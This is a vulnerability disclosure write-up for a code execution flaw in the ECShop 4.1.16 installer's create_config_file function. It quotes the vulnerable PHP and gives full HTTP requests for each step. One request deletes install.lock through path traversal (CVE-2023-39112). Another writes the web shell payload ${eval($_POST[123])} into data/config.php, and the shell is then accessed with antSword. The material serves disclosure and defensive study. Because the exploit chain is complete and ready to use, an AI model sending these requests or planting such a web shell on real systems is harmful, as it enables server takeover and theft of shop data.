# ECShop 4.1.16 Code Execution Vulnerability
## Application Info:
Name: ECShop

Version: 4.1.16

Website: http://www.ecshop.com

Download Link: http://update.shopex.com.cn/version/program/ECShop/download_ecshop_utf8.php

P.S. : You may need to register to download the source code(Here is an account for easy use, the account name is 17200750002, and the password is abc123456). The source folder of this project is the source code of the latest version 4.1.16 on the official website of ecshop.

## Website Development 
Website Environment: Apache 2.4.x + MySQL 5.7.x + PHP 5.6.x

![image](https://github.com/Luci4n555/vul_report/assets/116565145/e63fc0a3-a86f-457b-8554-30fecf9c0f8c)

Website root directory: \source\ecshop

![image](https://github.com/Luci4n555/vul_report/assets/116565145/cd20a79a-78ba-4b63-80fd-8bf63979bae5)

## Vulnerability Position

![image](https://github.com/Luci4n555/vul_report/assets/116565145/80ca12a2-5a96-461c-930a-c3c611066c03)

In the create_config_file() function on line 313 of the \source\ecshop\install\includes\lib_installer.php file
```
function create_config_file($db_host, $db_port, $db_user, $db_pass, $db_name, $prefix, $timezone)
{
    global $err, $_LANG;
    $db_host = construct_db_host($db_host, $db_port);

    $content = '<?' ."php\n";
    $content .= "// database host\n";
    $content .= "\$db_host   = \"$db_host\";\n\n";
    $content .= "// database name\n";
    $content .= "\$db_name   = \"$db_name\";\n\n";
    $content .= "// database username\n";
    $content .= "\$db_user   = \"$db_user\";\n\n";
    $content .= "// database password\n";
    $content .= "\$db_pass   = \"$db_pass\";\n\n";
    $content .= "// table prefix\n";
    $content .= "\$prefix    = \"$prefix\";\n\n";
    $content .= "\$timezone    = \"$timezone\";\n\n";
    $content .= "\$cookie_path    = \"/\";\n\n";
    $content .= "\$cookie_domain    = \"\";\n\n";
    $content .= "\$session = \"1440\";\n\n";
    $content .= "define('EC_CHARSET','".EC_CHARSET."');\n\n";
    $content .= "define('ADMIN_PATH','admin');\n\n";
    $content .= "define('AUTH_KEY', 'this is a key');\n\n";
    $content .= "define('OLD_AUTH_KEY', '');\n\n";
    $content .= "define('API_TIME', '');\n\n";
    $content .= "define('STORE_KEY','".md5(microtime() . mt_rand(0,1000))."');\n\n";
    $content .= '?>';


    $fp = @fopen(ROOT_PATH . 'data/config.php', 'wb+');
    if (!$fp)
    {
        $err->add($_LANG['open_config_file_failed']);
        return false;
    }
    if (!@fwrite($fp, trim($content)))
    {
        $err->add($_LANG['write_config_file_failed']);
        return false;
    }
    @fclose($fp);

    return true;
}
```
We control the variable value of $db_host, $db_port, $db_user, $db_pass, $db_name, $prefix, $timezone by constructing these variable values, and write them into the data/config.php file, resulting in arbitrary code execution.
![image](https://github.com/Luci4n555/vul_report/assets/116565145/cb5e67aa-b088-4743-af5c-07b861e9fea0)

And we can call the vulnerable function create_config_file() in line 228 of the \source\ecshop\install\index.php file.

```
case 'create_config_file' :
    $db_host    = isset($_POST['db_host'])      ?   trim($_POST['db_host']) : '';
    $db_port    = isset($_POST['db_port'])      ?   trim($_POST['db_port']) : '';
    $db_user    = isset($_POST['db_user'])      ?   trim($_POST['db_user']) : '';
    $db_pass    = isset($_POST['db_pass'])      ?   trim($_POST['db_pass']) : '';
    $db_name    = isset($_POST['db_name'])      ?   trim($_POST['db_name']) : '';
    $prefix     = isset($_POST['db_prefix'])    ?   trim($_POST['db_prefix']) : '';
    $timezone   = isset($_POST['timezone'])     ?   trim($_POST['timezone']) : 'Asia/Shanghai';

    $data = array(
        'SHOP_DB_HOST' => $db_host,
        'SHOP_DB_PORT' => $db_port,
        'SHOP_DB_DATABASE' => $db_name,
        'SHOP_DB_USERNAME' => $db_user,
        'SHOP_DB_PASSWORD' => $db_pass,
        'SHOP_DB_PREFIX' => $prefix,
        'SHOP_URL' => 'http://'.$_SERVER['HTTP_HOST'],
        'SHOP_H5' => 'http://'.$_SERVER['HTTP_HOST'].'/h5',
        'TOKEN_SECRET' => md5(time() . mt_rand(0,1000))
        );

    $result = create_config_file($db_host, $db_port, $db_user, $db_pass, $db_name, $prefix,  $timezone);
    $result_api = create_env($data,'appserver');
    $result_h5 = create_env($data,'h5');

    if ($result === false || $result_api === false || $result_h5 ===false)
    {
        echo implode(',', $err->get_all());
    }
    else
    {
        echo 'OK';
    }


    break;
```

## Vulnerability Verification
In order to achieve the purpose of file writing, we need to use CVE-2023-39112 to delete the specified file. The following is the request packet to delete the file, and the administrator cookie needs to be supplemented.
```
POST /admin/database.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

act=remove&file[]=../../data/install.lock
```

![image](https://github.com/Luci4n555/vul_report/assets/116565145/edfd2d8c-059c-4586-a133-d71c8a94cd91)

Then we exploit this vulnerability to write malicious code.
```
POST /install/index.php?step=create_config_file HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Connection: close

db_user=${eval($_POST[123])}
```

![image](https://github.com/Luci4n555/vul_report/assets/116565145/7b102c21-4fe4-4546-9c25-f775cafa3886)

We can see that the file source\ecshop\data\config.php has inserted malicious code.

![image](https://github.com/Luci4n555/vul_report/assets/116565145/05ed5a74-4f70-444b-916e-eab1f030d402)

Finally we use the antSwordPublic tool to connect and test code execution.
The link address is: http://127.0.0.1/data/config.php, the password is 123.

![image](https://github.com/Luci4n555/vul_report/assets/116565145/2dd54abb-0ee7-4167-a0a6-9e0cc3259624)

Successful execution of arbitrary code.
